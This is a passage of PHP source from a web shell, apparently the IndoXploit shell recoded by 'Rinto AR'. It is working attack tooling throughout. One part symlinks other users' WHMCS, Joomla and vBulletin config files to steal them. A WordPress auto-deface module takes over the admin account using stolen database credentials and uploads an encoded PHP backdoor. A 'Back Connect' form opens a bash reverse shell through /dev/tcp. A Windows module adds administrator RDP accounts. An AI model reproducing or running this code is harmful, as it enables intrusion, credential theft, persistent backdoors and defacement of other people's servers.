txt');@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="xaishell_grab">Open configs</a></font></b>';}

} elseif($_GET['do'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "rintoar";
		$pass = "xaixploit";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/xai_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By Rinto AR' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
} elseif($_GET['do'] == 'network') {
    echo "<center><form method='post'>
    Back Connect: <br>
    <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
    <input type='text' placeholder='port' name='port_bc' value='6969'><br>
    <input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
    </form>";
    if(isset($_POST['sub_bc'])) {
        $ip = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
    }
    echo "</center>";
} elseif($_GET['do'] == 'krdp_shell') {
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            $user = htmlspecialchars($_POST['user']);
            $pass = htmlspecialchars($_POST['pass']);
            if(preg_match("/$user/", exe("net user"))) {
                echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
            } else {
                $add_user   = exe("net user $user $pass /add");
                $add_groups1 = exe("net localgroup Administrators $user /add");
                $add_groups2 = exe("net localgroup Administrator $user /add");
                $add_groups3 = exe("net localgroup Administrateur $user /add");
                echo "[ RDP ACCOUNT INFO ]<br>
                ------------------------------<br>
                IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br>
                Username: <font color=lime>$user</font><br>
                Password: <font color=lime>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";
                if($add_user) {
                    echo "[add user] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add user] -> <font color='red'>Gagal</font><br>";
                }
                if($add_groups1) {
                    echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups2) {
                    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups3) {
                    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
                }
                echo "------------------------------<br>";
            }
        } elseif($_POST['s_opsi']) {
            $user = htmlspecialchars($_POST['r_user']);
            if($_POST['opsi'] == '1') {
                $cek = exe("net user $user");
                echo "Checking username <font color=lime>$user</font> ....... ";
                if(preg_match("/$user/", $cek)) {
                    echo "[ <font color=lime>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";
                } else {
                    echo "[ <font color=red>belum ada</font> ]";
                }
            } elseif($_POST['opsi'] == '2') {
                $cek = exe("net user $user xaishell");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=lime>xaishell</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } elseif($_POST['opsi'] == '3') {
                $cek = exe("net user $user /DELETE");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[remove user: <font color=lime>$user</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } else {
                //
            }
        } else {
            echo "-- Create RDP --<br>
            <form method='post'>
            <input type='text' name='user' placeholder='username' value='xaishell' required>
            <input type='text' name='pass' placeholder='password' value='xaishell' required>
            <input type='submit' name='create' value='>>'>
            </form>
            -- Option --<br>
            <form method='post'>
            <input type='text' name='r_user' placeholder='username' required>
            <select name='opsi'>
            <option value='1'>Cek Username</option>
            <option value='2'>Ubah Password</option>
            <option value='3'>Hapus Username</option>
            </select>
            <input type='submit' name='s_opsi' value='>>'>
            </form>
            ";
        }
    } else {
        echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
    }
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	$delete_dir = rmdir($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} elseif(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
} else {
	if(is_dir($dir) == true) {
		echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="th_home"><center>Name</center></th>
		<th class="th_home"><center>Type</center></th>
		<th class="th_home"><center>Size</center></th>
		<th class="th_home"><center>Last Modified</center></th>
		<th class="th_home"><center>Permission</center></th>
		<th class="th_home"><center>Action</center></th>
		</tr>';
		$scandir = scandir($dir);
		foreach($scandir as $dirx) {
			$dtype = filetype("$dir/$dirx");
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			if(!is_dir("$dir/$dirx")) continue;
 			if($dirx === '..') {
 				$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 			} elseif($dirx === '.') {
 				$href = "<a href='?dir=$dir'>$dirx</a>";
 			} else {
 				$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 			}
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 			}
 			echo "<tr>";
 			echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
			echo "<td class='td_home'><center>$dtype</center></td>";
			echo "<td class='td_home'><center>-</center></th>";
			echo "<td class='td_home'><center>$dtime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
		}
		echo "</tr>";
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
		}
		echo "</tr></table><hr>";
	} else {
		echo "<font color=red>can't open directory</font>";
	}
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://forum.indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit</font></a> Shell Recoded By <a href='http://fb.com/WeTryWhatWeCantDo' target='_BLANK'><font color=lime>Rinto AR</a></font></center></html>";}